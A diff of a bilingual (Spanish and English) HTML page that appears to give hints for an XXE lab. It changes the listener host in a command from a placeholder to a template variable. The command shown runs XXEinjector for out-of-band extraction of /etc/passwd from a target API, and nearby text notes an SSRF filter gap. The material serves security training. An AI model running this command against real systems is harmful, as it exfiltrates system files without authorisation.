@@ -163,7 +163,7 @@
         El filtro bloquea <code>file://</code> pero no <code>http://</code> — permite SSRF a servicios internos.</li>
       <li><strong>Hard:</strong> Bloquea <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. XXE directo está bloqueado. Usa técnicas avanzadas:
         <pre># XXEinjector para Out-of-Band (OOB) extraction
-ruby XXEinjector.rb --host=TU_IP --httpport=8080 \
+ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
   --file=/etc/passwd --oob=http \
   --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
     </ol>
@@ -257,7 +257,7 @@ ruby XXEinjector.rb --host=TU_IP --httpport=8080 \
         Filter blocks <code>file://</code> but not <code>http://</code> — allows SSRF to internal services.</li>
       <li><strong>Hard:</strong> Blocks <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. Direct XXE is blocked. Use advanced techniques:
         <pre># XXEinjector for Out-of-Band (OOB) extraction
-ruby XXEinjector.rb --host=YOUR_IP --httpport=8080 \
+ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
   --file=/etc/passwd --oob=http \
   --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
     </ol>
